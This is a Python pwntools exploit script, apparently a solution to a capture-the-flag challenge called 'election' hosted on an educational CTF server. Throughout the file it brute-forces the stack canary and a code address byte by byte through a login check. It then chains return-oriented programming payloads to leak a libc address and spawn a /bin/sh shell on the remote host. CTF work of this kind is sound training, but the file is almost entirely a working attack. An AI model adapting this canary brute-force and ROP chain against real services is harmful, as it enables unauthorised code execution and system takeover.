#!/usr/bin/env python
from pwn import * 
context.arch = 'amd64'

#r = process('./election', env={"LD_PRELOAD": "./libc.so"})

# nc edu-ctf.csie.org 10180
r = remote('edu-ctf.csie.org', 10180)
pause()

############################### round 1 -----------------------> leak addresses

# leak canary and <libc_csu_init> addr bruteforcely
aaa = 'a' * 0xb8
canary_leaker = []
pie_leaker = []

r.sendlineafter('>', '2')  # register
r.sendthen('Register an anonymous token: ', aaa)

j = 0
while j < 8:
    for i in range(256):
        r.sendlineafter('>', '1')  # login
        r.sendthen('Token: ', aaa + ''.join([chr(x) for x in canary_leaker]) + chr(i))
        if 'Invalid' not in r.recvline():
            canary_leaker.append(i)
            # print("j = {}, leaker = {}".format(j, canary_leaker))
            r.sendlineafter('>', '3')  # logout
            j += 1
            break

j = 0
while j < 8:
    for i in range(256):
        r.sendlineafter('>', '1')  # login
        r.sendthen('Token: ', aaa + ''.join([chr(x) for x in canary_leaker]) + ''.join([chr(x) for x in pie_leaker]) + chr(i))
        if 'Invalid' not in r.recvline():
            pie_leaker.append(i)
            r.sendlineafter('>', '3')  # logout
            j += 1
            break

canary = u64(''.join([chr(x) for x in canary_leaker]))
libc_csu_init = u64(''.join([chr(x) for x in pie_leaker]))
success("leaked canary: {}".format(hex(canary)))
success("leaked <__libc_csu_init>: {}".format(hex(libc_csu_init)))
base = libc_csu_init - 0x1140

offset_from_msg_to_canary = 0xde28 - 0xdd40

puts_plt = base + 0x940
stack_chk_fail_got = base + 0x201f98
pop_rdi = base + 0x11a3
main = base + 0xffb
# leave_ret = base + 0xbe9
ret = base + 0x906
buf = base + 0x202160

rop = flat(p64(buf + 32),
         p64(0xdeadbeef),
         p64(pop_rdi),
         p64(stack_chk_fail_got),
         p64(puts_plt),
         p64(ret),
         p64(main))

# rop = flat(p64(buf + 32),
         # p64(pop_rdi),
         # p64(stack_chk_fail_got),
         # p64(puts_plt),
         # p64(ret),
         # p64(main))

for j in range(25):
    r.sendlineafter('>', '2')  # register
    r.sendlineafter('Register an anonymous token: ', rop)
    r.sendlineafter('>', '1')  # login
    r.sendlineafter('Token: ', rop)

# vote
    for i in range(10):
        r.sendlineafter('>', '1')  # vote
        r.sendlineafter('[0~9]: ', '0')

    r.sendlineafter('>', '3') # logout

r.sendlineafter('>', '2')  # register
r.sendlineafter('Register an anonymous token: ', rop)
r.sendlineafter('>', '1')  # login
r.sendlineafter('Token: ', rop)

# vote
for i in range(5):
    r.sendlineafter('>', '1')  # vote
    r.sendlineafter('[0~9]: ', '0')

r.sendlineafter('>', '3') # logout

r.sendlineafter('>', '1')
r.sendlineafter('Token: ', rop)
r.sendlineafter('>', '2') # say something
r.sendlineafter(': ', '0') # to pusheen

# overflow rbp to 0x202230, return address to "leave ret" -> 0xbe9
pop_pop_pop_pop_ret = base + 0x119c
pop_pop_pop_ret = base + 0x119e
pop_pop_ret = 0x11a1
payload = flat('b' * offset_from_msg_to_canary,
               p64(canary),
               p64(buf),
               p64(pop_pop_pop_pop_ret)
               )

# payload = flat('b' * offset_from_msg_to_canary,
               # p64(canary),
               # p64(buf),
               # p64(pop_pop_ret)
               # )

r.sendlineafter('Message: ', payload) # to pusheen
r.sendlineafter('>', '3')

r.recvuntil('>')
r.recvline()
stack_chk_fail_libc = u64(r.recv(6) + '\0\0')
success("leaked stack_chk_fail@libc: {}".format(hex(stack_chk_fail_libc)))
libc_base = stack_chk_fail_libc - 0x134c80


################################ round 2 ------------> system('/bin/sh')
libc_system = libc_base + 0x4f440
libc = ELF('./libc.so')
bin_sh = libc_base + libc.search('/bin/sh').next()

rop2 = flat(p64(buf + 32),
            p64(0xdeadbeef),
            # p64(ret),
            p64(pop_rdi),
            p64(bin_sh),
            p64(libc_system),
            p64(ret),
            p64(main))

# rop2 = flat(p64(buf + 32),
            # p64(0xdeadbeef),
            # p64(pop_rdi),
            # p64(bin_sh),
            # p64(libc_system)
            # )

for j in range(25):
    r.sendlineafter('>', '2')  # register
    r.sendlineafter('Register an anonymous token: ', rop2)
    r.sendlineafter('>', '1')  # login
    r.sendlineafter('Token: ', rop2)

# vote
    for i in range(10):
        r.sendlineafter('>', '1')  # vote
        r.sendlineafter('[0~9]: ', '0')

    r.sendlineafter('>', '3') # logout

r.sendlineafter('>', '2')  # register
r.sendlineafter('Register an anonymous token: ', rop2)
r.sendlineafter('>', '1')  # login
r.sendlineafter('Token: ', rop2)


# vote
for i in range(5):
    r.sendlineafter('>', '1')  # vote
    r.sendlineafter('[0~9]: ', '0')

r.sendlineafter('>', '3') # logout

r.sendlineafter('>', '1')
r.sendlineafter('Token: ', rop2)
r.sendlineafter('>', '2') # say something
r.sendlineafter(': ', '0') # to pusheen

# overflow rbp to 0x202230, return address to "leave ret" -> 0xbe9
payload = flat('b' * offset_from_msg_to_canary,
               p64(canary),
               p64(buf),
               p64(pop_pop_pop_pop_ret)
               )

r.sendlineafter('Message: ', payload) # to pusheen
r.sendlineafter('>', '3')
r.interactive()




